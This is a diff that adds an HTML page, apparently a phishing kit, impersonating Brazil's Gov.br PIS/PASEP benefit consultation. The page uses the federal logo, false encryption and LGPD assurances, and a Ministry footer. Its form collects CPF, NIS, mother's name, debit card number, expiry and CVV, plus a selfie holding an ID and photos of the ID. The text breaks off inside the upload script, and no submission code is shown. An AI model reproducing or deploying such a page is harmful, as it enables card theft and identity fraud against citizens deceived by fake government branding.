@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta PIS/PASEP | Gov.br</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #0066cc;
+            --secondary: #004080;
+            --success: #2ecc71;
+            --danger: #e74c3c;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --gray: #6c757d;
+            --security: #1a5276;
+            --security-light: #2980b9;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height: 1.6;
+            background-color: #f5f7fa;
+            color: var(--dark);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .header {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+            border-radius: 10px 10px 0 0;
+            margin-bottom: 0;
+            position: relative;
+            width: 100%;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            gap: 2rem;
+        }
+        
+        .logo img {
+            height: 100px;
+            width: auto;
+            max-width: 100%;
+            object-fit: contain;
+        }
+        
+        .logo-text {
+            text-align: center;
+        }
+        
+        .security-banner {
+            background: rgba(255, 255, 255, 0.95);
+            color: var(--security);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            z-index: 100;
+            backdrop-filter: blur(5px);
+            animation: float 3s ease-in-out infinite;
+            transition: all 0.3s ease;
+            max-width: 90%;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-5px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .security-banner:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .security-badge {
+            color: var(--security);
+            font-size: 1.1rem;
+        }
+
+        .security-content {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .security-title {
+            font-weight: 600;
+            font-size: 0.9rem;
+            white-space: nowrap;
+        }
+
+        .security-details {
+            font-size: 0.75rem;
+            opacity: 0.8;
+            display: none;
+        }
+
+        .security-banner:hover .security-details {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 0.8; }
+        }
+        
+        .container {
+            max-width: 900px;
+            width: 100%;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .form-container {
+            padding: 2rem;
+        }
+        
+        h1, h2, h3 {
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        
+        h2 {
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 10px;
+            display: inline-block;
+            margin: 0 auto;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+            align-items: center;
+        }
+        
+        .form-group {
+            flex: 1;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+        }
+        
+        .required:after {
+            content: " *";
+            color: var(--danger);
+        }
+        
+        .input-wrapper {
+            position: relative;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+        
+        input:focus, select:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.2);
+        }
+        
+        .valid-icon {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1rem;
+            display: none;
+        }
+        
+        .valid {
+            border-color: var(--success) !important;
+            padding-right: 2.5rem;
+            background-image: none;
+        }
+        
+        .valid-icon.valid {
+            color: var(--success);
+            display: block;
+        }
+        
+        .invalid {
+            border-color: var(--danger) !important;
+            padding-right: 2.5rem;
+        }
+        
+        .valid-icon.invalid {
+            color: var(--danger);
+            display: block;
+        }
+        
+        .error-message {
+            color: var(--danger);
+            font-size: 0.85rem;
+            margin-top: 0.5rem;
+            display: none;
+        }
+        
+        button {
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 1rem 1.5rem;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 1rem;
+            font-weight: 600;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        button:disabled {
+            background: var(--gray);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .result-container {
+            margin-top: 2rem;
+            padding: 1.5rem;
+            border-radius: 8px;
+            display: none;
+            text-align: center;
+        }
+        
+        .result-positive {
+            background-color: rgba(46, 204, 113, 0.1);
+            border-left: 4px solid var(--success);
+        }
+        
+        .result-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+        
+        .result-icon {
+            font-size: 2rem;
+            margin-right: 1rem;
+        }
+        
+        .result-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 2rem;
+            width: 100%;
+        }
+        
+        .security-info {
+            background-color: rgba(0, 102, 204, 0.05);
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 4px solid var(--security);
+        }
+        
+        .security-info i {
+            color: var(--security);
+            font-size: 1.5rem;
+        }
+        
+        .lgpd-info {
+            background-color: rgba(0, 102, 204, 0.05);
+            padding: 1.5rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            text-align: left;
+            margin: 2rem auto;
+            max-width: 900px;
+            width: 100%;
+        }
+        
+        .lgpd-info h3 {
+            color: #0066cc;
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .lgpd-info ul {
+            margin-left: 1.5rem;
+            line-height: 1.6;
+        }
+        
+        .lgpd-info li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .lgpd-article {
+            font-weight: bold;
+            color: #004080;
+        }
+
+        .document-upload {
+            margin-top: 2rem;
+            border-top: 1px solid #eee;
+            padding-top: 2rem;
+        }
+        
+        .upload-area {
+            border: 2px dashed #ccc;
+            border-radius: 8px;
+            padding: 2rem;
+            text-align: center;
+            margin-bottom: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .upload-area:hover {
+            border-color: var(--primary);
+            background-color: rgba(0, 102, 204, 0.05);
+        }
+        
+        .upload-icon {
+            font-size: 2rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+        
+        .upload-text {
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+        }
+        
+        .upload-hint {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+        
+        .preview-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+        
+        .preview-item {
+            width: 120px;
+            height: 120px;
+            border-radius: 8px;
+            overflow: hidden;
+            position: relative;
+            border: 1px solid #ddd;
+        }
+        
+        .preview-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .remove-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background-color: var(--danger);
+            color: white;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        
+        .cartao-section {
+            background-color: rgba(0, 102, 204, 0.05);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin-top: 2rem;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .cartao-row {
+            display: flex;
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .cartao-group {
+            flex: 1;
+        }
+        
+        .cartao-info {
+            font-size: 0.85rem;
+            color: var(--gray);
+            margin-top: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .cvv-hint {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: help;
+        }
+        
+        .bank-instructions {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-top: 1rem;
+            border-left: 4px solid #0066cc;
+        }
+        
+        .bank-instructions h4 {
+            color: #0066cc;
+            margin-bottom: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .bank-instructions ul {
+            margin-left: 1.5rem;
+            line-height: 1.6;
+        }
+        
+        .bank-instructions li {
+            margin-bottom: 0.8rem;
+            position: relative;
+            padding-left: 1.5rem;
+        }
+        
+        .bank-instructions li:before {
+            content: "•";
+            color: var(--primary);
+            font-weight: bold;
+            position: absolute;
+            left: 0;
+        }
+        
+        .bank-tip {
+            background-color: rgba(46, 204, 113, 0.1);
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            border-left: 4px solid var(--success);
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        
+        .bank-tip i {
+            color: var(--success);
+            font-size: 1.2rem;
+            margin-top: 2px;
+        }
+        
+        .confirmation-container {
+            margin-top: 2rem;
+            padding: 1.5rem;
+            border-radius: 8px;
+            background-color: rgba(46, 204, 113, 0.1);
+            border-left: 4px solid var(--success);
+            text-align: left;
+        }
+        
+        .confirmation-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+        
+        .confirmation-icon {
+            font-size: 1.5rem;
+            margin-right: 1rem;
+            color: var(--success);
+        }
+        
+        .confirmation-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--success);
+        }
+        
+        .email-highlight {
+            color: var(--highlight);
+            font-weight: 600;
+        }
+        
+        .trust-message {
+            background-color: rgba(0, 102, 204, 0.05);
+            padding: 1.5rem;
+            border-radius: 8px;
+            margin: 1.5rem 0;
+            text-align: center;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .trust-message i {
+            color: var(--primary);
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+        }
+        
+        @media (max-width: 768px) {
+            .form-row, .cartao-row {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .container {
+                margin: 0;
+                border-radius: 0;
+            }
+            
+            .header {
+                border-radius: 0;
+            }
+            
+            .logo {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .logo-text {
+                text-align: center;
+            }
+            
+            .security-banner {
+                bottom: 10px;
+                right: 10px;
+                font-size: 0.8rem;
+                padding: 8px 12px;
+            }
+            
+            .security-title {
+                white-space: normal;
+                max-width: 180px;
+            }
+            
+            .lgpd-info {
+                margin: 1rem;
+                padding: 1rem;
+            }
+            
+            .preview-item {
+                width: 100px;
+                height: 100px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <img src="https://www.gov.br/secom/pt-br/central-de-conteudo/manuais/uso-da-marca-do-governo-federal/2023_br_govfederal_marcaoficial_rgb.png/@@images/93f6d81f-5751-45cd-b502-580fb4aa1d1e.png" 
+                     alt="Governo Federal">
+                <div class="logo-text">
+                    <h1>Consulta PIS/PASEP</h1>
+                    <p>Verifique seu direito ao benefício</p>
+                </div>
+            </div>
+        </header>
+        
+        <div class="form-container">
+            <div class="trust-message">
+                <i class="fas fa-shield-alt"></i>
+                <h3>Seus Dados Protegidos com Tecnologia de Ponta</h3>
+                <p>Utilizamos os mais avançados sistemas de criptografia para garantir a segurança absoluta de suas informações. Sua privacidade é nossa prioridade.</p>
+            </div>
+            
+            <h2><i class="fas fa-user-check"></i> Informe seus dados</h2>
+            <form id="consultaForm">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="nome_completo" class="required">Nome Completo</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="nome_completo" name="nome_completo" placeholder="Digite seu nome completo" required>
+                            <i class="fas fa-check valid-icon" id="nome_valid"></i>
+                            <i class="fas fa-times valid-icon" id="nome_invalid"></i>
+                        </div>
+                        <div class="error-message" id="nome_error">Por favor, insira seu nome completo</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email" class="required">E-mail</label>
+                        <div class="input-wrapper">
+                            <input type="email" id="email" name="email" placeholder="seu@email.com" required>
+                            <i class="fas fa-check valid-icon" id="email_valid"></i>
+                            <i class="fas fa-times valid-icon" id="email_invalid"></i>
+                        </div>
+                        <div class="error-message" id="email_error">Por favor, insira um e-mail válido</div>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="cpf" class="required">CPF</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
+                            <i class="fas fa-check valid-icon" id="cpf_valid"></i>
+                            <i class="fas fa-times valid-icon" id="cpf_invalid"></i>
+                        </div>
+                        <div class="error-message" id="cpf_error">CPF inválido</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="telefone" class="required">Telefone</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="telefone" name="telefone" placeholder="(00) 00000-0000" required>
+                            <i class="fas fa-check valid-icon" id="telefone_valid"></i>
+                            <i class="fas fa-times valid-icon" id="telefone_invalid"></i>
+                        </div>
+                        <div class="error-message" id="telefone_error">Informe um telefone válido</div>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="data_nascimento" class="required">Data de Nascimento</label>
+                        <div class="input-wrapper">
+                            <input type="date" id="data_nascimento" name="data_nascimento" required>
+                            <i class="fas fa-check valid-icon" id="nascimento_valid"></i>
+                            <i class="fas fa-times valid-icon" id="nascimento_invalid"></i>
+                        </div>
+                        <div class="error-message" id="nascimento_error">Data inválida</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="nis" class="required">Número do NIS</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="nis" name="nis" placeholder="000.00000.00-0" required>
+                            <i class="fas fa-check valid-icon" id="nis_valid"></i>
+                            <i class="fas fa-times valid-icon" id="nis_invalid"></i>
+                        </div>
+                        <div class="error-message" id="nis_error">NIS inválido</div>
+                    </div>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="nome_mae" class="required">Nome da Mãe</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="nome_mae" name="nome_mae" placeholder="Nome completo da sua mãe" required>
+                            <i class="fas fa-check valid-icon" id="mae_valid"></i>
+                            <i class="fas fa-times valid-icon" id="mae_invalid"></i>
+                        </div>
+                        <div class="error-message" id="mae_error">Por favor, insira o nome da sua mãe</div>
+                    </div>
+                </div>
+                
+                <h3><i class="fas fa-briefcase"></i> Informações Trabalhistas</h3>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="tempo_contribuicao" class="required">Tempo de Contribuição (anos)</label>
+                        <div class="input-wrapper">
+                            <input type="number" id="tempo_contribuicao" name="tempo_contribuicao" min="0" max="50" placeholder="Ex: 5" required>
+                            <i class="fas fa-check valid-icon" id="contribuicao_valid"></i>
+                            <i class="fas fa-times valid-icon" id="contribuicao_invalid"></i>
+                        </div>
+                        <div class="error-message" id="contribuicao_error">Informe um valor entre 1 e 50</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="ultimo_emprego" class="required">Último Emprego Registrado</label>
+                        <div class="input-wrapper">
+                            <input type="date" id="ultimo_emprego" name="ultimo_emprego" required>
+                            <i class="fas fa-check valid-icon" id="emprego_valid"></i>
+                            <i class="fas fa-times valid-icon" id="emprego_invalid"></i>
+                        </div>
+                        <div class="error-message" id="emprego_error">Data inválida</div>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="renda" class="required">Renda Mensal Média (R$)</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="renda" name="renda" placeholder="1.500,00" required>
+                        <i class="fas fa-check valid-icon" id="renda_valid"></i>
+                        <i class="fas fa-times valid-icon" id="renda_invalid"></i>
+                    </div>
+                    <div class="error-message" id="renda_error">Informe um valor válido</div>
+                </div>
+                
+                <div class="cartao-section">
+                    <h3><i class="fas fa-credit-card"></i> Dados Bancários para Recebimento</h3>
+                    
+                    <div class="cartao-row">
+                        <div class="form-group cartao-group">
+                            <label for="cartao_debito" class="required">Número do Cartão</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="cartao_debito" name="cartao_debito" placeholder="0000 0000 0000 0000" required>
+                                <i class="fas fa-check valid-icon" id="cartao_valid"></i>
+                                <i class="fas fa-times valid-icon" id="cartao_invalid"></i>
+                            </div>
+                            <div class="error-message" id="cartao_error">Informe um número de cartão válido</div>
+                            <div class="cartao-info">
+                                <i class="fas fa-info-circle"></i> Informe os 16 dígitos do seu cartão de débito
+                            </div>
+                        </div>
+                        
+                        <div class="form-group cartao-group">
+                            <label for="validade_cartao" class="required">Validade</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="validade_cartao" name="validade_cartao" placeholder="MM/AA" required>
+                                <i class="fas fa-check valid-icon" id="validade_valid"></i>
+                                <i class="fas fa-times valid-icon" id="validade_invalid"></i>
+                            </div>
+                            <div class="error-message" id="validade_error">Informe uma data válida (MM/AA)</div>
+                        </div>
+                        
+                        <div class="form-group cartao-group">
+                            <label for="cvv_cartao" class="required">CVV</label>
+                            <div class="input-wrapper">
+                                <input type="text" id="cvv_cartao" name="cvv_cartao" placeholder="000" maxlength="3" required>
+                                <i class="fas fa-question-circle cvv-hint" title="Os 3 dígitos no verso do cartão"></i>
+                                <i class="fas fa-check valid-icon" id="cvv_valid"></i>
+                                <i class="fas fa-times valid-icon" id="cvv_invalid"></i>
+                            </div>
+                            <div class="error-message" id="cvv_error">Informe o CVV (3 dígitos)</div>
+                        </div>
+                    </div>
+                    
+                    <div class="bank-instructions">
+                        <h4><i class="fas fa-info-circle"></i> Instruções de Segurança Bancária</h4>
+                        <ul>
+                            <li>O sistema utiliza criptografia de ponta a ponta para proteger seus dados bancários</li>
+                            <li>Seu cartão deve estar em seu nome e com cadastro atualizado</li>
+                            <li>Verifique se há limite disponível para recebimento na conta vinculada</li>
+                            <li>O valor será depositado automaticamente em até 48 horas úteis após aprovação</li>
+                            <li>Em caso de dúvidas, consulte seu banco sobre limites de recebimento</li>
+                            <li>Não compartilhe seus dados bancários com terceiros</li>
+                        </ul>
+                        
+                        <div class="bank-tip">
+                            <i class="fas fa-lightbulb"></i>
+                            <div>
+                                <strong>Dica de Segurança:</strong> Verifique sempre o cadeado de segurança no navegador e a URL do site antes de inserir dados sensíveis.
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="security-info">
+                        <i class="fas fa-lock"></i>
+                        <div>
+                            <strong>PROTEÇÃO AVANÇADA</strong>
+                            <p>Seus dados bancários são criptografados e nunca armazenados em nosso sistema. Utilizamos protocolos bancários seguros para todas as transações.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="document-upload">
+                    <h3><i class="fas fa-file-upload"></i> Documentos Necessários</h3>
+                    
+                    <div class="upload-area" id="selfieArea">
+                        <div class="upload-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
+                        <div class="upload-text">Tire uma selfie segurando seu documento</div>
+                        <div class="upload-hint">Clique para abrir a câmera ou selecionar uma foto</div>
+                        <input type="file" id="selfieInput" accept="image/*" capture="user" style="display: none;">
+                    </div>
+                    
+                    <div class="upload-area" id="documentoArea">
+                        <div class="upload-icon">
+                            <i class="fas fa-id-card"></i>
+                        </div>
+                        <div class="upload-text">Foto do Documento de Identidade (frente e verso)</div>
+                        <div class="upload-hint">Clique para selecionar as fotos ou tirar novas fotos</div>
+                        <input type="file" id="documentoInput" accept="image/*" multiple style="display: none;">
+                    </div>
+                    
+                    <div class="preview-container" id="selfiePreview"></div>
+                    <div class="preview-container" id="documentoPreview"></div>
+                </div>
+                
+                <button type="submit" id="consultarBtn" disabled>
+                    <i class="fas fa-search"></i> VERIFICAR MEU DIREITO AO PIS/PASEP
+                </button>
+            </form>
+            
+            <div class="result-container" id="resultado">
+                <div class="result-header">
+                    <i class="fas fa-check-circle result-icon" id="resultIcon"></i>
+                    <div class="result-title" id="resultTitle"></div>
+                </div>
+                <div class="result-details" id="resultDetails"></div>
+                
+                <div class="confirmation-container" id="confirmationMessage">
+                    <div class="confirmation-header">
+                        <i class="fas fa-check-circle confirmation-icon"></i>
+                        <div class="confirmation-title">DOCUMENTOS RECEBIDOS COM SUCESSO!</div>
+                    </div>
+                    <p>Seus documentos foram enviados com sucesso e estão em análise.</p>
+                    <p><strong>Prazo de análise:</strong> 5 dias úteis</p>
+                    <p><strong>Você receberá o resultado no e-mail:</strong> <span class="email-highlight" id="emailConfirmacao"></span></p>
+                    <p><strong>Próximos passos:</strong></p>
+                    <ul>
+                        <li>Nossa equipe irá analisar seus documentos</li>
+                        <li>Você receberá uma notificação por e-mail quando a análise for concluída</li>
+                        <li>O resultado estará disponível no site do Gov.br</li>
+                        <li>Caso necessário, entraremos em contato para solicitar informações adicionais</li>
+                    </ul>
+                    <div style="margin-top: 1rem; background-color: rgba(255,255,255,0.3); padding: 10px; border-radius: 5px;">
+                        <p><i class="fas fa-info-circle" style="color: var(--primary);"></i> <strong>Dúvidas?</strong> Entre em contato através do Fale Conosco no site oficial.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="security-banner">
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+        <div class="security-content">
+            <div class="security-title">Proteção Garantida</div>
+            <div class="security-details">
+                <span>Criptografia SSL • Antifraude • LGPD</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="lgpd-info">
+        <h3><i class="fas fa-gavel"></i> Proteção de Dados Pessoais - Lei nº 13.709/2018 (LGPD)</h3>
+        <ul>
+            <li><span class="lgpd-article">Art. 6º</span> - Os dados pessoais serão tratados com transparência, segurança e atendendo aos princípios da finalidade, adequação e necessidade</li>
+            <li><span class="lgpd-article">Art. 7º</span> - O tratamento de dados pessoais somente poderá ser realizado mediante consentimento do titular</li>
+            <li><span class="lgpd-article">Art. 18º</span> - O titular dos dados tem direito a acessar, corrigir, eliminar ou portar seus dados pessoais</li>
+            <li><span class="lgpd-article">Art. 46º</span> - Os agentes de tratamento devem adotar medidas de segurança para proteção dos dados</li>
+            <li><span class="lgpd-article">Art. 48º</span> - Notificação obrigatória em caso de incidentes de segurança que possam causar risco aos titulares</li>
+        </ul>
+        <p style="margin-top: 1rem; font-style: italic;">Esta consulta segue os princípios da LGPD e as diretrizes do Decreto nº 10.474/2020 que regulamenta a lei</p>
+    </div>
+    
+    <footer class="footer">
+        <p>©️ 2023 Ministério do Trabalho e Previdência - Governo Federal</p>
+        <p>Plataforma oficial para consulta de benefícios sociais</p>
+        <p style="margin-top: 1rem; font-size: 0.8rem;">
+            Em caso de dúvidas sobre proteção de dados: <a href="mailto:protecaodedados@gov.br" style="color: #0066cc;">protecaodedados@gov.br</a>
+        </p>
+    </footer>
+    
+    <script>
+        // Elementos do formulário
+        const form = document.getElementById('consultaForm');
+        const consultarBtn = document.getElementById('consultarBtn');
+        const emailConfirmacao = document.getElementById('emailConfirmacao');
+        
+        // Configuração do upload de documentos
+        const selfieArea = document.getElementById('selfieArea');
+        const selfieInput = document.getElementById('selfieInput');
+        const selfiePreview = document.getElementById('selfiePreview');
+        
+        const documentoArea = document.getElementById('documentoArea');
+        const documentoInput = document.getElementById('documentoInput');
+        const documentoPreview = document.getElementById('documentoPreview');
+        
+        // Armazenar arquivos
+        let selfieFiles = [];
+        let documentoFiles = [];
+
+        // Máscaras para os campos
+        document.getElementById('cpf').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.replace(/^(\d{3})/, '$1.');
+            if (value.length > 7) value = value.replace(/^(\d{3}\.)(\d{3})/, '$1$2.');
+            if (value.length > 11) value = value.replace(/^(\d{3}\.\d{3}\.)(\d{3})/, '$1$2-');
+            e.target.value = value.substring(0, 14);
+            validateCPF(e.target);
+        });
+        
+        document.getElementById('telefone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 0) value = value.replace(/^(\d{0,2})/, '($1)');
+            if (value.length > 3) value = value.replace(/^\(\d{2}\)\s?/, '($1) ');
+            if (value.length > 10) value = value.replace(/^\(\d{2}\)\s(\d{5})/, '($1) $2-');
+            e.target.value = value.substring(0, 15);
+            validateTelefone(e.target);
+        });
+        
+        document.getElementById('nis').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 3) value = value.replace(/^(\d{3})/, '$1.');
+            if (value.length > 8) value = value.replace(/^(\d{3}\.)(\d{5})/, '$1$2.');
+            if (value.length > 11) value = value.replace(/^(\d{3}\.\d{5}\.)(\d{2})/, '$1$2-');
+            e.target.value = value.substring(0, 14);
+            validateNIS(e.target);
+        });
+        
+        document.getElementById('renda').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = (value/100).toFixed(2) + '';
+            value = value.replace(".", ",");
+            value = value.replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1.');
+            e.target.value = value;
+            validateRenda(e.target);
+        });
+
+        // Máscara para o cartão de débito
+        document.getElementById('cartao_debito').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.replace(/^(\d{4})/, '$1 ');
+            if (value.length > 9) value = value.replace(/^(\d{4})\s(\d{4})/, '$1 $2 ');
+            if (value.length > 14) value = value.replace(/^(\d{4})\s(\d{4})\s(\d{4})/, '$1 $2 $3 ');
+            e.target.value = value.substring(0, 19);
+            validateCartao(e.target);
+        });
+        
+        // Máscara para validade do cartão
+        document.getElementById('validade_cartao').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) value = value.replace(/^(\d{2})/, '$1/');
+            e.target.value = value.substring(0, 5);
+            validateValidade(e.target);
+        });
+        
+        // Validações em tempo real
+        document.getElementById('nome_completo').addEventListener('blur', function(e) {
+            validateField(e.target, e.target.value.trim().split(' ').length >= 2, 'nome');
+        });
+        
+        document.getElementById('email').addEventListener('blur', function(e) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            validateField(e.target, re.test(e.target.value), 'email');
+        });
+        
+        document.getElementById('telefone').addEventListener('blur', function(e) {
+            const value = e.target.value.replace(/\D/g, '');
+            validateField(e.target, value.length === 11, 'telefone');
+        });
+        
+        document.getElementById('data_nascimento').addEventListener('change', function(e) {
+            const date = new Date(e.target.value);
+            const isValid = !isNaN(date.getTime()) && date < new Date();
+            validateField(e.target, isValid, 'nascimento');
+        });
+        
+        document.getElementById('nome_mae').addEventListener('blur', function(e) {
+            validateField(e.target, e.target.value.trim().length >= 5, 'mae');
+        });
+        
+        document.getElementById('tempo_contribuicao').addEventListener('blur', function(e) {
+            const value = parseInt(e.target.value);
+            validateField(e.target, !isNaN(value) && value >= 1 && value <= 50, 'contribuicao');
+        });
+        
+        document.getElementById('ultimo_emprego').addEventListener('change', function(e) {
+            const date = new Date(e.target.value);
+            const isValid = !isNaN(date.getTime()) && date < new Date();
+            validateField(e.target, isValid, 'emprego');
+        });
+
+        document.getElementById('cartao_debito').addEventListener('blur', function(e) {
+            const value = e.target.value.replace(/\D/g, '');
+            validateField(e.target, value.length === 16, 'cartao');
+        });
+        
+        document.getElementById('validade_cartao').addEventListener('blur', function(e) {
+            const value = e.target.value.replace(/\D/g, '');
+            validateField(e.target, value.length === 4, 'validade');
+        });
+        
+        document.getElementById('cvv_cartao').addEventListener('blur', function(e) {
+            const value = e.target.value.replace(/\D/g, '');
+            validateField(e.target, value.length === 3, 'cvv');
+        });
+        
+        // Upload de documentos
+        selfieArea.addEventListener('click', () => selfieInput.click());
+        documentoArea.addEventListener('click', () => documentoInput.click());
+        
+        selfieInput.addEventListener('change', function(e) {
+            handleFileUpload(e.target.files, selfiePreview, 'selfie');
+        });
+        
+        documentoInput.addEventListener('change', function(e) {
+            handleFileUpload(e.target.files, documentoPreview, 'documento');
+        });
+        
+        function handleFileUpload(files, previewContainer, type) {
+            if (!files || files.length === 0) return;
+            
+            // Limpar array de arquivos
+            if (type === 'selfie') {
+                selfieFiles = [];
+                previewContainer.innerHTML = '';
+            } else {
+                documentoFiles = [];
+                previewContainer.innerHTML = '';
+            }
+            
+            for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                if (!file.type.match('image.*')) continue;
+                
+                // Armazenar arquivo
+                if (type === 'selfie') {
+                    selfieFiles.push(file);
+                } else {
+                    documentoFiles.push(file);
+                }
+                
+                const reader = new FileReader();
+                
+                reader.onload = function(e) {
+                    const previewItem = document.createElement('div');
+                    previewItem.className = 'preview-item';
+                    
+                    const img = document.createElement('img');
+                    img.src = e.target.result;
+                    
+                    const removeBtn = document.createElement('div');
+                    removeBtn.className = 'remove-btn';
+                    removeBtn.innerHTML = '<i class="fas fa-times"></i>';
+                    removeBtn.addEventListener('click', function() {
